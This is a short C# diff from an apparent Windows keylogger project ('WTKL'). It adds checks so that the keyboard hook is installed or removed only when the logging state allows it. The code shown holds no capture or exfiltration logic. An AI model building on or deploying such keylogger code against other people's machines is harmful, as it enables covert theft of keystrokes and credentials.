@@ -111,8 +111,11 @@ namespace WTKL
          */
         public bool StartKeylogger()
         {
-            _hookID = SetHook(_proc);
-            logging = true;
+            if (!logging)
+            {
+                _hookID = SetHook(_proc);
+                logging = true;
+            }
             return logging;
         }
 
@@ -121,8 +124,11 @@ namespace WTKL
          */
         public bool StopKeylogger()
         {
-            UnhookWindowsHookEx(_hookID);
-            logging = false;
+            if (logging)
+            {
+                UnhookWindowsHookEx(_hookID);
+                logging = false;
+            }
             return logging;
         }
 
